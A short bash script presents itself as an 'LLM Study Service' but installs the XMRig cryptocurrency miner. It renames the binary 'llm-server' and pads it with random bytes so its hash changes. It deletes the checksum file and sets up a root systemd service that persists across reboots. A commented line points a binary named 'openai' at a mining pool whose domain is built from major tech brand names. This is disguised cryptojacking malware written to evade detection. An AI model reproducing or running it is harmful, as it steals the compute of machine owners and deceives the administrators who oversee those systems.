#!/bin/bash

U=$1
latest=`wget -qO- -t1 -T2 "https://api.github.com/repos/xmrig/xmrig/releases/latest" | grep "tag_name" | head -n 1 | awk -F ":" '{print $2}' | sed 's/\"//g;s/,//g;s/ //g' | awk -F "v" '{print $2}'`
wget -O LLM.tar.gz https://github.com/xmrig/xmrig/releases/download/v$latest/xmrig-$latest-linux-static-x64.tar.gz 
tar -zxvf LLM.tar.gz
mv xmrig-$latest LLM
mv LLM/xmrig LLM/llm-server
mv LLM /etc/LLM
rm -rf LLM.tar.gz
cd /etc/LLM && rm -rf SHA256SUMS
count=$((RANDOM % 1000 + 1))
for ((i = 0; i < count; i++)); do
  echo -n "0" >> "/etc/LLM/llm-server"
done
cat > /etc/systemd/system/llm.service <<EOL
[Unit]
Description=LLM Study Service
After=network.target

[Service]
Type=simple
ExecStart=/etc/LLM/llm-server -config 
Restart=on-failure
User=root

[Install]
WantedBy=multi-user.target
EOL

systemctl daemon-reload
systemctl enable llm.service
systemctl start llm.service
sleep 2
systemctl status llm.service
#./openai -a rx -o stratum+ssl://rx.microsoftazureamazonawsibmapplenvidiaoracleciscoadobe.com:443 -u $U -p x
